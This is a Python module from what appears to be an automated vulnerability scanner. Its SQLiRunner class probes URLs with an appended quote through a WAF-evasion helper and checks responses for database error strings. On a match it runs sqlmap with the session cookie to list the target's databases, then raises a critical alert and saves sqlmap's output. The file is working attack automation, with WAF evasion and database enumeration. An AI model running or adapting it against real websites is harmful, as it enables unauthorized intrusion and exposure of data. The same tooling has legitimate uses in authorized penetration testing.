import subprocess
import requests # Added missing import
import logging
import shlex
from urllib.parse import urlparse, parse_qs
from core.waf_evader import waf_evader
from core.notifier import send_alert
from core.auth_manager import auth_manager
from config.settings import settings

class SQLiRunner:
    def scan(self, url: str):
        """
        Phase 1: Heuristic check.
        Phase 2: SQLMap if suspicious.
        """
        if not self._heuristic_check(url):
            return

        logging.info(f"Suspicious SQLi parameters found at {url}. Launching SQLMap...")
        self._run_sqlmap(url)

    def _heuristic_check(self, url: str) -> bool:
        # Inject quote and check for error
        # This is a very basic heuristic.
        try:
            parsed = urlparse(url)
            if not parsed.query:
                return False
                
            test_url = url + "'"
            resp = waf_evader.get(test_url)
            
            error_sigs = ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL error"]
            for err in error_sigs:
                if err.lower() in resp.text.lower():
                    logging.info(f"Heuristic SQLi found: {err}")
                    return True
            return False
        except requests.exceptions.ConnectionError:
            logging.warning(f"[-] Target dead/unreachable: {url}")
            return False
        except Exception:
            return False

    def _run_sqlmap(self, url: str):
        # sqlmap -u [url] --cookie [auth_cookie] --batch --risk 1 --level 1 --dbs
        cookie = auth_manager.get_cookie_string()
        
        # Construct command
        # Ensure SQLMAP_PATH is correct or use 'python sqlmap.py' if it's a script
        sqlmap_bin = settings.SQLMAP_PATH.split() 
        
        cmd = sqlmap_bin + ["-u", url, "--batch", "--risk=1", "--level=1", "--dbs"]
        if cookie:
            cmd.extend(["--cookie", cookie])
            
        try:
            # We run with timeout to avoid hanging forever
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            # Check for results in stdout usually "available databases"
            if "available databases" in result.stdout:
                proof = "SQLMap found databases. Check logs."
                send_alert("SQL Injection Confirmed", "SQLi", f"Target: {url}\n{proof}", "CRITICAL")
                
                log_file = settings.DATA_DIR / "sqli_findings.txt"
                with open(log_file, "a") as f:
                    f.write(f"Vulnerable URL: {url}\n")
                    f.write(result.stdout)
                    f.write("-" * 50 + "\n")
                    
        except Exception as e:
            logging.error(f"SQLMap execution failed: {e}")

sqli_runner = SQLiRunner()
